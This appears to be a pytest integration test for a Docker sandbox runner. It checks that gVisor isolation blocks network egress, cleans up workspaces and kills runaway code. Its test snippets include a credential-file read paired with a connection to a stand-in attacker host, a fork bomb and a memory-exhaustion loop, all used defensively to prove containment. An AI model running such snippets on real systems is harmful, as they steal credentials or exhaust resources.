"""VM release checks; opt in with POD_DOCKER_TESTS=1 and a capped POD_WORK_ROOT."""
import asyncio
import os
import shutil
import tempfile
from pathlib import Path
from types import SimpleNamespace

import docker
import pytest
from pod.sandbox import DockerSandboxRunner, SandboxLimits, SandboxSpec

pytestmark = [
    pytest.mark.docker,
    pytest.mark.skipif(os.environ.get("POD_DOCKER_TESTS") != "1", reason="opt-in Linux VM Docker integration"),
]


class InspectingContainers:
    def __init__(self, containers):
        self.delegate = containers
        self.created = []

    def create(self, *args, **kwargs):
        container = self.delegate.create(*args, **kwargs)
        container.reload()
        self.created.append(container.attrs["HostConfig"]["Runtime"])
        return container

    def __getattr__(self, name):
        return getattr(self.delegate, name)


def test_image_and_isolation():
    client = docker.from_env()
    client.ping()
    uid, gid = os.getuid(), os.getgid()
    if uid == 0 or gid == 0:
        pytest.fail("integration tests must run as a non-root service user")
    image, _ = client.images.build(path=str(Path(__file__).resolve().parents[2] / "sandbox"),
                                   tag="pod-sandbox:test",
                                   buildargs={"RUNNER_UID": str(uid), "RUNNER_GID": str(gid)})
    # Reachability is an explicit prerequisite, not silently interpreted as isolation.
    connect = "import socket; s=socket.create_connection(('1.1.1.1',443),timeout=5); s.close(); print('connected')"
    control = client.containers.run(image.tags[0], ["python", "-c", connect], runtime="runc",
                                    network_mode="bridge", remove=True)
    assert b"connected" in control, "positive-control egress must be reachable"

    root = Path(os.environ.get("POD_WORK_ROOT", "/srv/pod/work"))
    root.mkdir(parents=True, exist_ok=True)
    workspace = Path(tempfile.mkdtemp(prefix="pod-integration-", dir=root))
    containers = InspectingContainers(client.containers)
    config = SimpleNamespace(work_root=workspace, sandbox_image=image.tags[0], runtime="runsc",
                             sandbox_concurrency=2, require_capped_workroot=True,
                             sandbox_uid=uid, sandbox_gid=gid)
    runner = DockerSandboxRunner(config, SimpleNamespace(containers=containers))

    def execute(code, seconds=20):
        result = asyncio.run(runner.run(SandboxSpec(purpose="integration", command=["python", "/work/snippet.py"],
                             files={"snippet.py": code}, limits=SandboxLimits(timeout_s=seconds))))
        assert containers.created[-1] == "runsc"
        assert not client.containers.list(all=True, filters={"label": "pod.sandbox=1"})
        assert not list(workspace.iterdir()), "workspace remains after sandbox execution"
        assert result.destroyed_at is not None and not result.cleanup_error
        return result

    try:
        assert execute("print(1)").outcome == "passed"
        exfil = execute("import socket\nprint(open('/home/runner/.aws/credentials').read())\ntry: socket.create_connection(('collector.attacker.invalid', 443), timeout=3)\nexcept OSError: print('blocked')")
        assert exfil.outcome == "passed"
        assert "honeytoken_read" in {e.type for e in exfil.telemetry}
        assert {e.type for e in exfil.telemetry} & {"dns_lookup", "net_connect"}
        assert "blocked" in exfil.stdout_tail
        network = execute("import socket\ntry:\n socket.create_connection(('1.1.1.1',443),timeout=5)\n print('unexpected success')\nexcept OSError:\n print('connect blocked')")
        assert network.outcome == "passed" and "connect blocked" in network.stdout_tail
        assert "unexpected success" not in network.stdout_tail
        assert execute("while True: pass", 2).outcome == "timeout_killed"
        memory = execute("x=[]\ntry:\n while True: x.append(bytearray(1024*1024))\nexcept MemoryError:\n print('MEMORY_LIMIT',flush=True)\n raise SystemExit(42)", 30)
        assert memory.outcome == "oom_killed" or (memory.outcome == "error" and "MEMORY_LIMIT" in memory.stdout_tail)
        fork = execute("import os,time\nwhile True:\n try:\n  if os.fork() == 0: time.sleep(60); os._exit(0)\n except OSError as e:\n  print('PID_LIMIT', e.errno, flush=True); raise SystemExit(42)", 20)
        assert fork.outcome == "error" and "PID_LIMIT" in fork.stdout_tail
    finally:
        shutil.rmtree(workspace)
